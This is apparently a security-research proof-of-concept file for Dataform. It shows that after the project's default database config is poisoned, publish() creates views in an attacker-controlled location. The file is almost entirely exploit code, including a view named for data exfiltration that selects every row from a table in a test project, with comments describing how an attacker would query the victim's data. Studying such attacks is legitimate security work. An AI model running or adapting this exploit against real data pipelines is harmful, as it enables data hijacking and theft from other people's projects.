config { type: "view", name: "aab_publish_exploit" }

js {
  // =============================================================================
  // EXPLOIT: publish() with Poisoned Config Target
  // =============================================================================
  //
  // This demonstrates that publish() called after config poisoning
  // will create tables/views in the POISONED location.
  //
  // Attack scenario:
  // 1. Attacker poisons defaultDatabase to point to their project
  // 2. Attacker calls publish() to create a view
  // 3. The view is created in attacker's project, not victim's
  // 4. Attacker can now query victim's data via the hijacked view
  //
  // =============================================================================

  let exploitLog = {
    timestamp: new Date().toISOString(),
    exploit: "publish_target_hijack"
  };

  // Record current (possibly already poisoned) config
  exploitLog.configAtStart = {
    defaultDatabase: dataform.projectConfig.defaultDatabase,
    defaultSchema: dataform.projectConfig.defaultSchema
  };

  // Demonstrate we can create a table via publish()
  // In a real attack, this could point to attacker-controlled dataset
  try {
    // Create a view that captures data
    const hijackedView = publish("hijacked_view")
      .query(`
        -- This view is created in the default (possibly poisoned) schema
        SELECT
          'EXPLOIT_SUCCESS' as status,
          '${new Date().toISOString()}' as exploit_time,
          '${dataform.projectConfig.defaultDatabase}' as target_database,
          '${dataform.projectConfig.defaultSchema}' as target_schema
      `);

    exploitLog.publishSuccess = true;
    exploitLog.createdAction = "hijacked_view";
  } catch(e) {
    exploitLog.publishError = e.message;
  }

  // Also try to create a view that would exfiltrate data from another table
  try {
    publish("data_exfil_view")
      .query(`
        -- In a real attack, this would SELECT from victim's sensitive tables
        -- and create a view accessible to the attacker
        SELECT
          *
        FROM \`shir-research-3.dataform_poc.simple_test\`
      `);
    exploitLog.exfilViewCreated = true;
  } catch(e) {
    exploitLog.exfilViewError = e.message;
  }

  exploitLog.status = "PUBLISH_EXPLOIT_COMPILED";
}

SELECT '${JSON.stringify(exploitLog)}' as publish_exploit_status
